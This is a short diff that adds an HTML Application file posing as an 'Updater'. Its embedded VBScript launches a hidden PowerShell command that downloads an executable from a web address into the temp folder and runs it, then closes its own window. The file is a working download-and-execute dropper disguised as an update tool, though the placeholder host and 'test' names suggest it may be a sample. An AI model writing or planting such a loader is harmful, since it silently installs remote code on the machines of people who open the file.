@@ -1,0 +1,12 @@
+<html>
+<head>
+  <HTA:APPLICATION ID="test" APPLICATIONNAME="Updater" BORDER="none" />
+  <script language="VBScript">
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell -w hidden -c ""iwr -uri 'https://example.com/test.exe' -OutFile $env:TEMP\test.exe; Start-Process $env:TEMP\test.exe"""
+    window.close
+  </script>
+</head>
+<body>
+</body>
+</html>
